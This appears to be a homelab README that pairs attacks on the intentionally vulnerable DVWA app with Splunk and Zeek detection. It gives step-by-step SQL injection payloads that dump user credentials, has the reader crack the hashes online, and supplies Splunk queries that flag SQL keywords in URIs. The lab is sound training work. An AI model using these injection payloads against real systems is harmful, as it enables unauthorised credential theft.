# 🔴🔵 Red Team / Blue Team Lab

## Overview

A hands-on attack and detection lab using DVWA (Damn Vulnerable Web Application) as the target, Kali Linux Purple as the attack platform, and Splunk SIEM with Zeek network monitoring for blue team detection and analysis.

This setup allows simultaneous offensive and defensive practice — attack from the NUC, watch it appear in Splunk in real time.

---

## Lab Architecture

```
Kali NUC (Attacker - 192.168.xxx.xx)
        │
        │ HTTP attack traffic
        │
Homelab Server (192.168.xxx.xx)
        │
        ├── DVWA container (port 8888) ← Target
        │       └── Apache logs → /var/log/dvwa/access.log
        │
        └── Splunk Forwarder
                └── Forwards apache_access logs → Splunk Enterprise (NUC port 9997)
                                                        │
                                                   Zeek conn.log
                                                   Zeek dns.log
                                                   Zeek http.log
```

---

## DVWA Setup

### Docker Compose

```yaml
services:
  dvwa:
    image: vulnerables/web-dvwa
    container_name: dvwa
    ports:
      - "8888:80"
    volumes:
      - /var/log/dvwa:/var/log/apache2
    restart: unless-stopped
```

The volume mount exposes Apache logs to the host at `/var/log/dvwa/` for Splunk forwarding.

### Access

```
http://192.168.xxx.xx:8888
```

Default credentials: `admin:password`

On first login click **Create / Reset Database** at the bottom of the page.

### Security Level

Set difficulty in **DVWA Security** tab:
- **Low** — No input sanitization, easiest to exploit
- **Medium** — Basic filtering, bypassable
- **High** — Stronger filtering
- **Impossible** — Secure implementation for comparison

---

## Splunk Log Forwarding

### Add DVWA Apache logs to forwarder

```bash
sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/dvwa/access.log -sourcetype apache_access -auth 'admin:yourpassword'
```

### Verify monitor is active

```bash
sudo /opt/splunkforwarder/bin/splunk list monitor | grep dvwa
```

### Blue team Splunk search

```spl
index=* sourcetype=apache_access host=homelab earliest=-15m
```

---

## Attack Labs

### Lab 1 — SQL Injection

**Objective:** Extract user credentials from the database using SQL injection.

**DVWA Page:** SQL Injection (set to Low)

#### Step 1 — Confirm vulnerability
Enter a single quote to test for errors:
```
1'
```
A MySQL syntax error confirms unsanitized input.

#### Step 2 — Bypass with OR condition
```
1' or 1=1#
```
The `#` comments out the rest of the query. Returns all users.

#### Step 3 — Determine column count with UNION
```
1' UNION SELECT null,null#
```
Two nulls worked — confirms 2 columns in the query.

#### Step 4 — Extract database version
```
1' UNION SELECT null,version()#
```
Returns MariaDB version — useful for identifying vulnerabilities.

#### Step 5 — Dump credentials
```
1' UNION SELECT user,password FROM users#
```
Returns all usernames and MD5 password hashes.

#### Step 6 — Crack hashes
Paste hashes into **crackstation.net** — MD5 hashes for weak passwords crack instantly.

**Result:** `admin:password`, `gordonb`, `pablo`, `smithy`, `1337` all retrieved.

#### Blue Team Detection in Splunk

```spl
index=* sourcetype=apache_access host=homelab
| search uri="*UNION*" OR uri="*SELECT*" OR uri="*1=1*"
| table _time src uri status
```

SQL injection attempts appear as GET requests with encoded SQL syntax in the URI:
```
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23
```

**IOCs to look for:**
- URL-encoded SQL keywords (`%27` = `'`, `%23` = `#`, `UNION`, `SELECT`)
- Repeated requests to the same endpoint with varied parameters
- HTTP 200 responses to unusual query strings

---

## Attack Labs — Coming Soon

### Lab 2 — XSS (Cross-Site Scripting)
Inject malicious JavaScript into web forms and observe how it executes in the browser.

### Lab 3 — Command Injection
Execute system commands through unsanitized web inputs.

### Lab 4 — Brute Force with Hydra
Automate credential attacks against login forms and observe Fail2ban responses.

### Lab 5 — File Upload Vulnerability
Upload malicious files and observe server-side execution.

---

## Blue Team Dashboard Queries

### All DVWA Traffic
```spl
index=* sourcetype=apache_access host=homelab
| table _time src uri status bytes
| sort -_time
```

### SQL Injection Detection
```spl
index=* sourcetype=apache_access host=homelab
| search uri="*UNION*" OR uri="*SELECT*" OR uri="*1%3D1*" OR uri="*%27*"
| stats count by src uri
| sort -count
```

### Attack Timeline
```spl
index=* sourcetype=apache_access host=homelab
| timechart count by status
```

### Top Attack Sources
```spl
index=* sourcetype=apache_access host=homelab
| stats count by src
| sort -count
```

---

## Tools Used

| Tool | Role | Purpose |
|------|------|---------|
| DVWA | Target | Intentionally vulnerable web app |
| Firefox | Attack client | Manual injection testing |
| Splunk Enterprise | Blue team SIEM | Log analysis and detection |
| Zeek 8.1.1 | Network monitor | Traffic capture and analysis |
| Splunk Forwarder | Log shipping | Forwards DVWA Apache logs to Splunk |
| CrackStation | Hash cracking | Offline MD5 hash cracking |

---

## Security Note

DVWA is intentionally vulnerable and should **never** be exposed to the internet. It is deployed for internal lab use only with no port forwarding to the public internet. Stop the container when not actively practicing:

```bash
sudo docker stop dvwa
```
